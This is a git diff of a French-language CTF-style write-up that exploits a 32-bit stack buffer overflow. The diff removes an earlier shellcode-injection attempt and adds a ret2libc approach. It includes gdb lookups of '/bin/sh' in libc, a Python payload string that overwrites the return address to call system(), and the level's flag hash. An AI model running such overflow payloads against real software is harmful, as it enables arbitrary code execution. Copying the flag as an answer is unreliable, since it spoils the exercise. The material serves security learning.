@@ -1,3 +1,4 @@
+```s
 080484d4 <p>:
  80484d4:	55                   	push   ebp
  80484d5:	89 e5                	mov    ebp,esp
@@ -42,60 +43,10 @@
  804854d:	90                   	nop
  804854e:	90                   	nop
  804854f:	90                   	nop
-
+```
 
 La difficulté ici, est d'écrire des codes d'opérations à exécuter (donc injecter du code), dans la mémoire chargée de l'ordinateur, et remplacer la valeur de retour par le pointeur sur ce code.
 Mais, on a une sécurité à bypass. C'est le fameux `eax & 0xb0000000 == 0xb0000000`. On est quasiment sûr que notre exploit sera contenu à cet adresse.
-
-C'est super, mais on a quand même un gros indice avec le fait d'avoir deux fonctions. Je pense que l'adresse `ret` à attaquer, c'est celle du `main`. On laisse la valeur de `ret` de la fonction `p` tranquille, et on fait pointer celle de `main` sur nos instructions.
-
-D'après mes calculs, l'adresse de retour de main est à la position `40` de notre buffer. Il suffirait donc de :
-1. Créer un buffer de 40 caractères.
-2. Définir à la position 40 l'adresse de la position 44
-3. Mettre nos opcodes.
-4. Voir ce qu'il se passe.
-
-Je vais essayer d'exécuter la fonction `p` :
-`0x080484d4` => `\xd4\x84\x04\x08`
-
-Injection :
-`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd4\x84\x04\x08`
-
-Et paf! Ça fonctionne ! Du coup, ne perdons plus une seule seconde, faut tester le PoC avec un script qui fait `exit(42)`.
-
-```s
-global _start
-
-section .text
-_start:
-	xor eax, eax
-	mov al, 42
-	mov ebx, 0h
-	int 80h
-```
-
-```sh
-nasm -f elf32 level2.s
-ld -melf_i386 level2.o -o level2.out
-```
-
-Donne après la compilation et le linker le binaire suivant :
-```
-08049000 <_start>:
- 8049000:       31 c0                   xor    %eax,%eax
- 8049002:       b0 2a                   mov    $0x2a,%al
- 8049004:       31 db                   xor    %ebx,%ebx
- 8049006:       cd 80                   int    $0x80
-```
-
-On doit donc injecter les instructions suivantes juste après l'adresse :
-`\x31\xc0\xb0\x2a\x31\xdb\xcd\x80`
-
-Notre injection sera donc :
-0xbfff
-`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x40\xf7\xff\xbf\x31\xc0\xb0\x2a\x31\xdb\xcd\x80`
-
-NOP:
 
 https://shell-storm.org/shellcode/index.html
 1. On overflow.
@@ -104,11 +55,14 @@ https://shell-storm.org/shellcode/index.html
 
 String `/bin/sh` présente dans la libc.so a l'offset `0x160c58` (`objdump -s`)
 ```
-info proc map # Get the start address
+(gdb) info proc map # Get the start address
 (gdb) x/s 0xb7e2c000+0x160c58
 0xb7f8cc58:	 "/bin/sh"
-
 ```
+
+Donc on va overflow deux adresses. La première sera l'adresse de `ret`, afin de passer au destack de l'adresse suivante n'étant pas soumise à vérification.
+La seconde adresse va pointer vers la fonction `system` comprise dans la `libc`, puis, on va ajouter l'adresse de retour de `system` dans la stack, et enfin, on pourra mettre le premier argument pour `system`, c'est-à-dire, la chaine de caractère trouvée dans la `libc`.
+
 `python -c 'print("A"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\x90\x90\x90\x90" + "\x58\xcc\xf8\xb7")'`
 
 Flag: `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
